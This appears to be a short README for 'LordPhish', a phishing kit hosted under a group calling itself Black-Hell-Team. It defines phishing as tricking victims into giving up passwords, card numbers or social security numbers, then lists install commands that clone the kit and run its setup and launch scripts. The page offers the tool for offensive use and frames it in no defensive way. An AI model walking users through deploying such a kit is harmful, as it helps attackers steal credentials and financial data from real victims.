LordPhish

Phishing is a type of online scam where an attacker sends a fraudulent email, text message, or website to trick a

victim into providing sensitive information such as passwords, credit card numbers, or social security numbers.

Installation

  • apt-get update -y
  • apt-get install php -y
  • apt-get install openssh -y
  • apt-get install wget -y
  • apt-get install git -y
  • git clone https://github.com/Black-Hell-Team/LordPhish.git
  • cd LordPhish
  • bash setup.sh
  • bash lord.sh
